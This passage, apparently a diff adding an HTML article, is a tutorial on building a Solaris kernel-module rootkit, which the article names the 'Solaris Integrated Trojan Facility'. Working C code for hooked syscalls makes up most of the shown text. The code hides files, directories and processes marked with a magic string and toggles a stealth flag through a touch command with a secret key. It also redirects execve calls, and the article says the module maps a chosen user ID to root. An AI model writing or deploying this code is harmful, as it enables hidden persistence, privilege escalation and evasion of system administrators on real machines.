+memmove(buf3, (char *) buf3 + buf3->d_reclen, i);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+buf3->d_off = 1024;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ret -= reclen;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+}&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/*&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+* most people implement this little check into their modules,</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+* don't ask me, if some of the solaris fs driver modules really</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+* generate a d_reclen=0.</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+* correction: this code is needed for solaris sparc at least,</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+* otherwise you`ll find yourself back in a world of crashes.</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*/</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+if (buf3->d_reclen &lt; 1) {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ret -= i;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+i = 0;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+}&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+if (i != 0)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+buf3 = (struct dirent64 *) ((char *) buf3 + buf3->d_reclen);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copyout((char *) buf2,
+(char *) buf, ret);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kmem_free(buf2, oldret);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; return ret;</tt>
+<br><tt>}</tt></blockquote>
+Understanding this code is not that easy, since it works with the weird
+dirent structure, but the <tt>dirent</tt> struct is also present in Linux
+and can be understand reading the man pages and the specific headers, I
+won't go into more details.&nbsp;
+<br>There is still a minor problem with this piece of code, when you include
+the magic string more than once in to your filename the module won't act
+correctly, it looks like the <tt>strstr()</tt> function causes problems
+while running inside the kernel. I plan to fix this bug in version 2.0
+of the article / module, until then include the magic string only once
+in your filenames.</blockquote>
+<font size=+1>5.2&nbsp;&nbsp; Hiding directories and file content</font>
+<blockquote>This idea has been taken from pragamatic's Linux kernel module
+article. If files are hidden from being listed as described above they still
+can be accessed by everybody and directories can be entered by everybody
+too. I used a switch (see 5.3 Generating a remote switch) to toggle these
+features On and Off. So if I don't want anybody to access the content of
+my hidden files or anybody to enter my hidden directories, I would turn
+the switch On.&nbsp;
+<br>The syscall open64() is used to open files for reading and writing
+under Solaris (not inside the /proc), if the filename of the file to be
+opened contains the magic word and the security flag is set, the faked
+syscall will return the error message: "No such file or directory".&nbsp;
+<blockquote><tt>#define MAGIC&nbsp;&nbsp; "CHT.THC"&nbsp;</tt>
+<br><tt>char magic[] = MAGIC;</tt>
+<br><tt>int security = FALSE;</tt>
+<p>[...]
+<p><tt>int newopen64(const char *path, int oflag, mode_t mode)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int ret;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int len;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; char namebuf[1028];</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp; ret = oldopen64(path, oflag, mode);</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if (ret >= 0) {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copyinstr(path, namebuf,
+1028, (size_t *) &amp; len);</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (security &amp;&amp;
+strstr(namebuf, (char *) &amp;magic) != NULL) {</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+cmn_err(CE_NOTE, "sitf: hiding content of file (%s)", namebuf);</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+set_errno(ENOENT);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+return -1;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ret;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>}</tt>
+<br><tt></tt>&nbsp;</blockquote>
+The syscall chdir() is used to change the current directory, if someone
+tries to enter a directory containing the magic string and the security
+flag is set, the faked syscall will return the error message: "No such
+file or directory".
+<blockquote><tt>int newchdir(const char *path)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; char namebuf[1028];</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int len;</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp; copyinstr(path, namebuf, 1028, (size_t *) &amp;
+len);</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if (security &amp;&amp; strstr(namebuf, (char
+*) &amp;magic) != NULL) {</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE, "sitf:
+hiding directory (%s)", namebuf);</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set_errno(ENOENT);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; } else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return oldchdir(path);</tt>
+<br><tt>}</tt>
+<br><tt></tt>&nbsp;</blockquote>
+These two functions combined with the faked <tt>getdents64()</tt>
+call protect all files and directories you want to hide including their
+content. But how can you easily switch between the total security and a
+work-environment where files are hidden but you can access and manipulate
+them, e.g. configuration files, read on.</blockquote>
+<font size=+1>5.3&nbsp;&nbsp; Generating a remote switch</font>
+<blockquote>While investigating some of the most used command line programs,
+I stumbeld over <tt>/usr/bin/touch</tt>, touch uses the syscall <tt>creat64()</tt>.
+I found this to be a good place to include a remote switch, for toggling
+features of a module On or Off, e.g. the security flag above in 5.2. Of
+cause this is not a real secure switch because an administrator could monitor
+you activities and will discover you suspicious touch calls.
+<br>First of all we need to define a key that will help us being the only
+person toggling our switch.
+<blockquote><tt>#define KEY "mykey"</tt>
+<br><tt>char key[] = KEY;</tt>
+<p>[...]
+<p><tt>int newcreat64(const char *path, mode_t mode)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; char namebuf[1028];</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int len;</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp; copyinstr(path, namebuf, 1028, (size_t *) &amp;
+len);</tt><tt></tt>
+<p><tt>&nbsp;&nbsp;&nbsp; if (strstr(namebuf, (char *) &amp;key) != NULL)
+{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (security) {</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+cmn_err(CE_NOTE, "sitf: disabeling security");</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+security = FALSE;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+cmn_err(CE_NOTE, "sitf: enabeling security");</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+security = TRUE;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set_errno(ENFILE);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; } else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return oldcreat64(path,
+mode);</tt>
+<br><tt>}</tt></blockquote>
+When the touch command is used the syscall <tt>creat64()</tt> will be called.
+Our faked syscall will check if the filename includes our key and then
+en- or disable the security flag. In order to tell us if this suceed it
+will return the error (<tt>ENFILE, </tt>The system file table is full).
+I hope this is a rather seldom error message.</blockquote>
+<font size=+1>5.4&nbsp;&nbsp; Hiding processes (proc file system approach)</font>
+<blockquote>Before I concentrated on the structured proc of Solaris, I
+developed a basic way to hide files from being listed. This code should
+only function as an example because it may consume a lot cpu power.
+<br>When a user executes <tt>ps</tt> or <tt>top</tt> these tools will read
+parts of the proc file systems and return their content. The file that
+halts information about the process caller and the executed file is <tt>psinfo</tt>
+found inf <tt>/proc/&lt;pid>/psinfo</tt>. The content of this file is described
+in <tt>/usr/include/sys/procfs.h</tt>.&nbsp;
+<blockquote><tt>typedef struct psinfo {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
+pr_flag;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* process flags */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
+pr_nlwp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* number of lwps in
+process */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid_t&nbsp;&nbsp; pr_pid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* unique process id */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid_t&nbsp;&nbsp; pr_ppid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* process id of parent */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid_t&nbsp;&nbsp; pr_pgid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* pid of process group leader */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid_t&nbsp;&nbsp; pr_sid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* session id */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uid_t&nbsp;&nbsp; pr_uid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* real user id */</tt>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [...]
+<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;
+pr_psargs[PRARGSZ];&nbsp;&nbsp;&nbsp;&nbsp; /* initial characters of arg
+list */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
+pr_wstat;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* if zombie, the wait()
+status */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
+pr_argc;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* initial argument
+count */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uintptr_t pr_argv;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* address of initial argument vector */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uintptr_t pr_envp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* address of initial environment vector */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;
+pr_dmodel;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* data model of the process */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;
+pr_pad2[3];</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;
+pr_filler[7];&nbsp;&nbsp; /* reserved for future use */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lwpsinfo_t pr_lwp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* information for representative lwp */</tt>
+<br><tt>} psinfo_t;</tt>
+<br>&nbsp;</blockquote>
+It's always the size of the<tt> psinfo_t</tt> struct. The member <tt>psargs</tt>
+includes the executed filename and the following arguments. Whenever a
+file named <tt>psinfo</tt> is opened a faked <tt>open()</tt> syscall will
+set a special flag, signaling that one of the next <tt>read()</tt> calls
+will read this file. Note that inside the /proc file system Solaris uses
+the <tt>open()</tt> syscall instead of the <tt>open64()</tt> syscall.&nbsp;
+<blockquote><tt>#define MAGIC "CHT.THC"</tt>
+<br><tt>char magic[] = MAGIC;</tt>
+<br><tt>char psinfo[] = "psinfo";</tt>
+<br><tt>int psfildes = FALSE;</tt>
+<p>[...]
+<p><tt>int newopen(const char *path, int oflag, mode_t mode)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int ret;&nbsp;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; ret = oldopen(path, oflag, mode);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; if (strstr(path, (char *) &amp;psinfo) != NULL)
+{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; psfildes = ret;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; } else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; psfildes = FALSE;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; return ret;</tt>
+<br><tt>}</tt></blockquote>
+A redirected <tt>read()</tt> function will look into the file if it has
+the size of a <tt>psinfo</tt> file and the <tt>open64()</tt> call has set
+the <tt>psfildes</tt> flag to the specific file descriptor. The<tt> read()</tt>
+syscall will then copy the content of the file to a <tt>psinfo_t</tt> struct
+and compare the executed file with the magic string. This is done by investigating
+<tt>psinfo_t->pr_psargs</tt>.
+If the magic string is found it will return an error and this proc entry
+won't be displayed in a process listing.&nbsp;
+<blockquote><tt>ssize_t</tt>
+<br><tt>newread(int fildes, void *buf, size_t nbyte)</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; ssize_t ret;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; psinfo_t *info;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; ret = oldread(fildes, buf, nbyte);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; if (fildes > 0 &amp;&amp; fildes == psfildes
+&amp;&amp; nbyte == sizeof(psinfo_t)) {&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; info = (psinfo_t *)
+kmem_alloc(sizeof(psinfo_t), KM_SLEEP);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copyin(buf, (void *)
+info, sizeof(psinfo_t));</tt>
+<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strstr(info->pr_psargs,
+(char *) &amp;magic) != NULL) {</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+cmn_err(CE_NOTE,"hiding process: %s", info->pr_psargs);</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+kmem_free(info, sizeof(psinfo_t));</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+set_errno(ENOENT);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+return -1;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+kmem_free(info, sizeof(psinfo_t));</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; return ret;</tt>
+<br><tt>}</tt></blockquote>
+You see that this is really not a proper way to hide processes from being
+listed because a lot cpu power will be wasted by the <tt>open64()</tt>
+and the <tt>read()</tt> call due to the fact that they got called very
+often on any system. A really fast method can be found in 5.6 Hiding processes
+(structured proc approach), just read on.</blockquote>
+<font size=+1>--->&nbsp;&nbsp; Module: sitf0.1.c&nbsp;</font>
+<blockquote>The module sitf0.1.c (Solaris Integrated Trojan Facility) demonstrates
+all topics described above, it is configured by setting the following variables:
+<ol><tt>#define MAGIC&nbsp;&nbsp; "CHT.THC"</tt>
+<br><tt>#define KEY&nbsp;&nbsp;&nbsp;&nbsp; "mykey"</tt>
+<br><tt>#define UID&nbsp;&nbsp;&nbsp;&nbsp; 1001</tt></ol>
+If a file or a process includes the string <tt>MAGIC</tt>, it will not
+be listed by any tool. Directories or file content of files containing
+this string will also be unaccessiable if the security flag is set. You
+can toggle the security flag by using the touch command, <tt>KEY</tt> is
+the argument for touch.
+<blockquote><tt>$ touch mykey</tt></blockquote>
+The UID specifies the user id that should automatically be mapped to root
+if a user logs on.You can monitor all activities via syslogd if you compiled
+the module with the <tt>DEBUG</tt> defintion.</blockquote>
+<font size=+1>5.5&nbsp;&nbsp; Redirecting an execve() call</font>
+<blockquote>Redirecting the execve() call was really a challange on Solaric
+(Sparc), because the kernel really "cares" about a proper user- and kernel
+memory transfer. The following code does not allocate user memory, it simply
+overwrites the defined buffer with the new command to execute, eventhough
+I have tested this call a thousand times and nothing bad happened, I advice
+you to read the next version of this article, that will feature some
+techniques
+to allocate user memory properly.
+<blockquote><tt>#define OLDCMD&nbsp; "/bin/who"</tt>
+<br><tt>#define NEWCMD&nbsp; "/usr/openwin/bin/xview/xcalc"</tt>
+<br><tt>char oldcmd[] = OLDCMD;</tt>
+<br><tt>char newcmd[] = NEWCMD;</tt>
+<p>[...]
+<p><tt>int newexecve(const char *filename, const char *argv[], const char
+*envp[])</tt>
+<br><tt>{</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; int ret;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; char *name;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; unsigned long addr;&nbsp;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp; name = (char *) kmem_alloc(256, KM_SLEEP);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; copyin(filename, name, 256);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; if (!strcmp(name, (char *) oldcmd)) {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; copyout((char *) newcmd,
+(char *) filename, strlen(newcmd) + 1);</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmn_err(CE_NOTE,"sitf:
+executing %s instead of %s", newcmd, name);</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; }</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; kmem_free(name, 256);&nbsp;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp; return oldexecve(filename, argv, envp);</tt>
+<br><tt>}</tt></blockquote>
+</blockquote>
+<font size=+1>5.6&nbsp;&nbsp; Hiding processes (structured proc approach)</font>
+<blockquote>This is a proper approach for hiding processes from being listed.
+Take a look at the header file <tt>/usr/include/sys/proc.h</tt>, you will
+find inside the large <tt>proc_t</tt> struct a member that is called <tt>struct
+user p_user</tt>. Every process owns such a <tt>proc_t </tt>struct. Solaris
+generates the files inside the /proc directory from these <tt>proc_t</tt>
+entries and their corresponding values. If you look into the definition
+of the <tt>user</tt> struct in <tt>/usr/include/sys/user.h</tt>, you will
+find what I was looking for the last weeks:
+<ol><tt>typedef struct&nbsp; user {</tt>
+<p>[...]
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * Executable file
+info.</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct exdata&nbsp;&nbsp;
+u_exdata;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; auxv_t&nbsp; u_auxv[__KERN_NAUXV_IMPL];
+/* aux vector from exec */</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;
+u_psargs[PSARGSZ];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* arguments from exec
+*/</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;
+u_comm[MAXCOMLEN + 1];</tt>
+<p>[...]</ol>
+The member <tt>u_psargs</tt> carries the executed filename of a process
+and its arguments, this is a good place to check if we should hide the
+process. There is a little macro defintion in proc.h that helps us getting
+the <tt>p_user</tt> entry from <tt>proc_t</tt>:
+<ol><tt>/* Macro to convert proc pointer to a user block pointer */</tt>
+<br><tt>#define PTOU(p)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+(&amp;(p)->p_user)</tt></ol>
+Now we can determine the exectued filename of every process if we know
+where the <tt>proc_t</tt> struct is. Another nice funtions helps us finding
+the <tt>proc_t</tt> struct from a corresponding <tt>pid:</tt> <tt>proc_t
+*prfind(pid_t). </tt>A tool listing process accesses the /proc directory
+that stores the processes sorted by their <tt>pids</tt>. I included a small
+check into the <tt>getdents64()</tt> fake syscall from above, so the function
+<tt>check_for_process()
+</tt>gets
+called.
+<blockquote>[...]
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <tt>while (i > 0) {</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+reclen = buf3->d_reclen;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+i -= reclen;</tt>
+<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+if ((strstr((char *) &amp;(buf3->d_name), (char *) &amp;magic) != NULL)
+||</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+check_for_process((char *) &amp;(buf3->d_name))) {</tt>
+<br><tt>#ifdef DEBUG</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+cmn_err(CE_NOTE,"sitf: hiding file/process (%s)", buf3->d_name);</tt>
+<br><tt>#endif</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+if (i != 0)</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+memmove(buf3, (char *) buf3 + buf3->d_reclen, i);</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+else</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+buf3->d_off = 1024;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ret -= reclen;</tt>
+<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+}</tt>
+<p>[...]</blockquote>
+Now let's take a look at the <tt>check_for_process()</tt> function. In
+the following code I use a small function called <tt>sitf_isdigit()</tt>
+and <tt>sitf_atoi()</tt>, you should easily guess what these function do.
+In this content it tells us if the file is maybe inside the proc and represents
+a pid. The <tt>check_process()</tt> call implements the mechanism described
+above:
+<br>&nbsp;
+<blockquote><tt>int check_for_process(char *filename)</tt>
+<br><tt>{</tt>
